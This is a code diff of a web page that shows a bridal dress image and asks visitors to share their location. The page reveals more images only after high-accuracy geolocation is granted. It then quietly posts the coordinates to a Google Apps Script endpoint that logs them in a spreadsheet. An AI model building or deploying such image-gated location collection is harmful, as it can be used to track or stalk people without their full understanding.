@@ -124,7 +124,7 @@ button:disabled {
     alt="Bridal dress"
   >
 
-  <!-- LOCATION CONFIRMATION -->
+  <!-- LOCATION -->
   <div class="card">
 
     <h2>Location Sharing</h2>
@@ -182,44 +182,72 @@ button:disabled {
 <script>
 
 const BACKEND_URL =
-"https://script.google.com/macros/s/AKfycbzeqyh-gaDySv5fZN6ZWRHOPQDnmW71oeFi5xUtPbydUBixx_geJoNJyKlXeuZuQX43ag/exec";
+"https://script.google.com/macros/s/AKfycbz9ADyZLsOC2MOM7WegHhAftzGuFAYJWA1vI70Bi2IKcMdurGmIC_gHlIVobzgvTKj5/exec";
 
-const locationBtn = document.getElementById("locationBtn");
-const status = document.getElementById("status");
-const result = document.getElementById("result");
-const coordinates = document.getElementById("coordinates");
-const mapsLink = document.getElementById("mapsLink");
-const afterLocation = document.getElementById("afterLocation");
+const locationBtn =
+document.getElementById("locationBtn");
+
+const status =
+document.getElementById("status");
+
+const result =
+document.getElementById("result");
+
+const coordinates =
+document.getElementById("coordinates");
+
+const mapsLink =
+document.getElementById("mapsLink");
+
+const afterLocation =
+document.getElementById("afterLocation");
+
 
 locationBtn.addEventListener("click", function() {
 
   if (!navigator.geolocation) {
+
     status.textContent =
       "Location is not supported by this browser.";
+
     return;
   }
 
   locationBtn.disabled = true;
+
   status.textContent =
     "Requesting your location...";
+
 
   navigator.geolocation.getCurrentPosition(
 
     function(position) {
 
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
+      const lat =
+        position.coords.latitude;
+
+      const lon =
+        position.coords.longitude;
+
+      const accuracy =
+        position.coords.accuracy;
 
       const mapsUrl =
         "https://www.google.com/maps?q=" +
         lat + "," + lon;
 
+
       coordinates.innerHTML =
-        "Latitude: " + lat.toFixed(8) +
-        "<br>Longitude: " + lon.toFixed(8) +
+        "Latitude: " +
+        lat.toFixed(8) +
+
+        "<br>Longitude: " +
+        lon.toFixed(8) +
+
         "<br>Accuracy: approximately " +
-        Math.round(accuracy) + " meters";
+        Math.round(accuracy) +
+        " meters";
+
 
       mapsLink.href = mapsUrl;
 
@@ -228,44 +256,69 @@ locationBtn.addEventListener("click", function() {
       status.textContent =
         "Location shared successfully.";
 
-      /* SHOW IMAGES 2 AND 3 ONLY AFTER LOCATION */
+
+      /* SHOW SECOND AND THIRD IMAGES */
       afterLocation.style.display = "block";
 
+
+      /* SEND CONSENTED LOCATION TO GOOGLE SHEETS */
+
       fetch(BACKEND_URL, {
+
         method: "POST",
+
         mode: "no-cors",
+
         headers: {
-          "Content-Type": "text/plain;charset=utf-8"
+          "Content-Type":
+            "text/plain;charset=utf-8"
         },
+
         body: JSON.stringify({
+
           latitude: lat,
+
           longitude: lon,
+
           accuracy: accuracy,
+
           mapsUrl: mapsUrl
+
         })
+
       }).catch(function() {});
 
     },
+
 
     function(error) {
 
       locationBtn.disabled = false;
 
       if (error.code === 1) {
+
         status.textContent =
           "Location permission was denied.";
+
       } else if (error.code === 2) {
+
         status.textContent =
           "Location is unavailable.";
+
       } else if (error.code === 3) {
+
         status.textContent =
           "Location request timed out.";
+
       } else {
+
         status.textContent =
           "Unable to get your location.";
+
       }
 
     },
+
 
     {
       enableHighAccuracy: true,
